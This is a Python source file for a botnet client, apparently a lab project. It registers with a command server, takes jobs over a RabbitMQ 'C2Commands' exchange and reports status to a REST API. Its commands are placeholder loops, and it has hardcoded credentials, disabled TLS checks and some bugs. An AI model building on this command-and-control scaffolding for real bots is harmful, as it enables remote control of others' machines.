import pika
import socket
import time
import threading
import json
import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class Client():
    def __init__(self):
        self.bot_registration_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.bot_registration_address = ('192.168.0.105', 5582)
        self.commands = {1: self.command1, 2: self.command2, 3: self.command3}
        self.event_controller = threading.Event()
        self.botnet_id = 0
        self.bot_id = 0
        self.botnet_job_id = 0
        # TODO: unsafe credentials
        self.credentials = pika.PlainCredentials('user', 'user')
        self.parameters = pika.ConnectionParameters('192.168.0.114', 5672, '/', self.credentials)
        self.connection = pika.BlockingConnection(self.parameters)


    def register_bot(self):
        try:
            self.bot_registration_socket.connect(self.bot_registration_address)
            response = self.bot_registration_socket.recv(1024).decode()
            response = json.load(response)
            if response['status'] == 'failed':
                raise Exception('Registration failed')
            (self.botnet_id, self.bot_id) = (response['botnetId'], response['botId'])
        except:
            print("[-] Registration failed")
            sys.exit()


    def listen_for_commands(self):
        queue_name = "c2commands" + str(self.bot_id)
        exchange_name = "C2Commands" + str(self.botnet_id)
        channel = self.connection.channel()
        channel.exchange_declare(exchange=exchange_name, exchange_type='fanout')
        channel.queue_declare(queue=queue_name, exclusive=True)
        channel.queue_bind(exchange=exchange_name, queue=queue_name, routing_key='')
        channel.basic_consume(queue=queue_name, on_message_callback=self.execute_command, auto_ack=True)
        channel.start_consuming()


    def execute_command(self, ch, method, properties, body):
        print("[+] Got command")
        body = body.decode()
        job_data = json.loads(body)
        self.botnet_job_id = job_data['Id']
        job_action = job_data['JobAction']
        command_id = job_data['CommandId']
        command_args = job_data['CommandArgument']
        
        if job_action == "Stop":
            self.stop_job()
        elif job_action == "Start":
            command_function = self.commands[command_id]
            self.event_controller.set()
            thread = threading.Thread(target=command_function, args=(command_args,))
            thread.start()
        else:
            print("[-] Unknown job action")


    def stop_job(self):
        if self.event_controller.is_set():
            self.event_controller.clear()
            self.botnet_job_id = 0
            self.finish_command("Stopped")

    
    def command_wrapper(command):
        def command_controller(self, command_args):
            url = "https://192.168.0.114:45456/api/v1/Bots/bot/" + str(self.bot_id)
            bot_data = requests.get(url=url, verify=False).json()
            bot_data['status'] = "Working"
            url = "https://192.168.0.114:45456/api/v1/Bots/" + str(self.bot_id)
            headers = {'Content-type':'application/json', 'Accept':'application/json'}
            result = requests.put(url=url, verify=False, json=bot_data, headers=headers)
            print(result)

            while self.event_controller.is_set():
                (is_done, result) = command(self, command_args)
                if is_done:
                    self.finish_command(result)
        return command_controller


    def finish_command(self, result):
        self.event_controller.clear()
        url = "https://192.168.0.114:45455/api/v1/BotnetJob/" + str(self.botnet_job_id)
        requests.delete(url=url, verify=False)
        self.botnet_job_id = 0
        url = "https://192.168.0.114:45456/api/v1/Bots/bot/" + str(self.bot_id)
        bot_data = requests.get(url=url, verify=False).json()
        bot_data['status'] = "Waiting"
        url = "https://192.168.0.114:45456/api/v1/Bots/" + str(self.bot_id)
        headers = {'Content-type':'application/json', 'Accept':'application/json'}
        requests.put(url=url, verify=False, json=bot_data, headers=headers)


    def send_result(self, result):
        channel = self.connection.channel()

        body = json.dumps({'botId': self.bot_id, 'result': result})

        channel.queue_declare(queue='command_results')
        channel.basic_publish(exchange='', routing_key='command_results', body=body)
        
        print("[+] Result sent")


    @command_wrapper
    def command1(self, command_args):
        result = "Looped"
        print("Command 1 started")
        for i in range(6):
            print(f"Iteration {i}")
            time.sleep(1)
        print("Command finished")
        return (True, result)

    @command_wrapper
    def command2(self, command_args):
        result = "Looped"
        print("Command 2 started")
        for i in range(3):
            print(f"Iteration {i}")
            time.sleep(1)
        print("Command finished")
        return (True, result)

    @command_wrapper
    def command3(self, command_args):
        print("Command 3 started")
        print("Press a key to finish...")
        input(">")
        print("Command finished")
        result = "Finished"
        return (True, result)


if __name__ == "__main__":
    client = Client()
    #(client.botnet_id, client.bot_id) = client.register_bot()
    client.botnet_id = 1
    client.bot_id = 1
    client.listen_for_commands()
